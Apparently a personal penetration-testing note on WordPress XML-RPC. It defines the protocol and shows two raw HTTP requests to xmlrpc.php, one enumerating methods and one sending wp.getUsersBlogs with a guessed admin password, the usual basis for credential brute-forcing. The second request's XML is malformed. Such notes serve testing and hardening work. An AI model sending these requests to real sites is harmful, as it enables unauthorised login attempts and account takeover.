
**XML‑RPC** is a remote procedure call (RPC) protocol that allows a client to execute methods on a remote server using **XML‑encoded requests** sent over **HTTP/HTTPS**. The client sends an XML request containing the method name and parameters, and the server processes it and returns the result in XML format. It is commonly used in web applications and APIs (for example in WordPress via `xmlrpc.php`) to enable remote interactions such as publishing content, authentication, or managing resources programmatically.

- example.com/xmlrpc.php

![[Pasted image 20260320100359.png]]

```html
POST /xmlrpc.php HTTP/2
Host: example.ir
Cookie: popup_form_dismissed_2=1
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 99



<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

![[Pasted image 20260320102618.png]]


```html
POST /xmlrpc.php HTTP/2
Host: example.ir
Cookie: popup_form_dismissed_2=1
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 217

<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
<param>
<value>
admin
</value>
</param>
<value>
p@asSWord123
</value>
<param>
</param>
</params>
</methodCall>
```

![[Pasted image 20260320103316.png]]